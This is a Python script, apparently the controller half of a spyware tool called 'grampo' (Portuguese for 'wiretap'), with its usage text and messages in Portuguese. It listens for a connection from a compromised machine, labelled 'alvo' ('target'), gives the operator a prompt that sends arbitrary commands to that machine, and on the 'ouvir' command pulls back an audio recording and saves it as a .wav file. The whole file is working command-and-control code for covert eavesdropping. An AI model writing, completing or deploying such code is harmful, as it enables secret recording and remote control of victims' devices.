import socket
from sys import argv
from socket import error


def app():
    inf = """
+--------------------------------------------------------------+
|                                                              |
| <1> - python controlador\ grampo.py [ip] [port]              |
| <2> - aguardar acesso!                                       |
|..............................................................+
|             |||||||||||||||||||||||||||                      |
|                       .wav                                   |                                                              |
+--------------------------------------------------------------+ """
    return inf


def transf(conn, cmd):
    conn.send(cmd.encode())
    f = open('/home/grampo/ouvir.wav', 'wb')
    while True:
        bits = conn.recv(9000000)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            print('| <::audio transferido::> ')
            break
        f.write(bits)


def connecting(ip, port):
    s = socket.socket()
    s.bind((str(ip), int(port)))
    s.listen(1)
    print('| <aguardando> - ')
    conn, addr = s.accept()
    print(f'| <acess> - {addr}')

    while True:
        cmd = input("| ouvir@alvo:~#  ")
        if 'exit' in str(cmd).lower():
            conn.send('exit'.encode())
            print("+--------------------------------------------------------------+\n")
            break
        elif 'ouvir' in cmd:
            print("| <ouvindo>")
            transf(conn, cmd)
        else:
            conn.send(cmd.encode())


if __name__ == '__main__':

    inf = app()

    try:
        print(inf)
        ip = argv[1]
        port = argv[2]
        connecting(ip, port)
    except IndexError:
        print("| <!!!>  python grampo.py [ip] [port]\n")
    except KeyboardInterrupt:
        pass
    except OSError:
        print("| <port> : porta em uso\n")
    except socket.error:
        print("| <port> : 4 digitos\n")
    except EOFError:
        print("\n")

